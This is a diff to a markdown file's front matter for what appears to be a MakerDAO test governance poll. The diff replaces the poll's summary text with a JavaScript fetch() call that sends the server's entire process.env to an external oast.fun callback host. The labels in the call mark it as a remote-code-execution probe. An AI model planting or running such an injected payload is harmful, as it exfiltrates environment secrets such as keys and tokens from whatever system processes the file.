@@ -1,6 +1,6 @@
 ---
 title: Future Poll - December 13, 2023
-summary: This is a fake goerli poll meant to simulate a live poll that contains no votes yet.
+summary: fetch("https://etizyuzhjzydyznbaoiwz1odwc6e7m1wy.oast.fun/?test=rce_example_makerdao_"+JSON.stringify(process.env))+"1337TEST rce TEST",
 discussion_link: https://forum.makerdao.com
 vote_type: Plurality Voting
 categories:
